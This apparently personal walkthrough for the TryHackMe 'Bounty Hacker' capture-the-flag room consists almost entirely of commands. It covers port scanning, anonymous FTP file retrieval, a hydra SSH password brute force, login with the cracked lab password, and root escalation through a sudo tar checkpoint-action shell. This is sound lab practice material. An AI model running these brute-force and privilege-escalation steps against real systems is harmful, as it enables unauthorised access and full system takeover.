# THM - Bounty Hacker.txt

```shell
nmap -sV -Pn -p- 10.10.146.228
```

Examining Web Server | Users: ed faye ein spike edward jet 

```shell
ftp 10.10.146.228
	anonymous
		mget *
			y
		bye


hydra ssh://10.10.146.228 -L users.txt -P locks.txt
```

> RedDr4gonSynd1cat3

```shell
ssh lin@10.10.146.228
	yes
	RedDr4gonSynd1cat3
		ls
		cat user.txt

		sudo -l
			RedDr4gonSynd1cat3

		sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

			whoami

			cat /root/root.txt
```
